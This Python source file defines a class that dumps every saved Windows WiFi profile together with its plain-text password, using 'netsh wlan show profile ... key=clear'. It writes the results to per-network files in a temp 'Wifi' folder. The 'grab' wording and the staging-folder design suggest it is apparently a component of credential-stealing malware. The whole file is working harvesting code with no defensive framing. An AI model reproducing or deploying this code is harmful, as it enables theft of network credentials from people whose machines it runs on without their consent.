import os
import subprocess
import time

class Wifi:
    def __init__(self, temp_path):
        self.temp_path = temp_path
        self.networks = {}
        self.get_networks()
        self.save_networks()

    def get_networks(self):
        
        try:
            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"], shell=True).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "All User Profile" in line or "Profil" in line]
            for profile in profiles:
                if profile:
                    try:
                        profile_info = subprocess.check_output(
                            ["netsh", "wlan", "show", "profile", profile, "key=clear"], shell=True
                        ).decode(errors='ignore')
                        self.networks[profile] = profile_info
                    except subprocess.CalledProcessError:
                        self.networks[profile] = "No key available (permission denied or no password)"
        except Exception as e:
            print(f"WiFi network grab failed: {e}")

    def save_networks(self):
  
        os.makedirs(os.path.join(self.temp_path, "Wifi"), exist_ok=True)
        if self.networks:
            for network, info in self.networks.items():
                timestamp = time.ctime()
                enhanced_info = f"Timestamp: {timestamp}\nNetwork: {network}\n{info}"
                with open(os.path.join(self.temp_path, "Wifi", f"{network}.txt"), "w", encoding="utf-8") as f:
                    f.write(enhanced_info)
            print(f"Saved {len(self.networks)} WiFi profiles")
        else:
            with open(os.path.join(self.temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
                f.write(f"Timestamp: {time.ctime()}\nNo WiFi networks found.")
            print("No WiFi networks saved")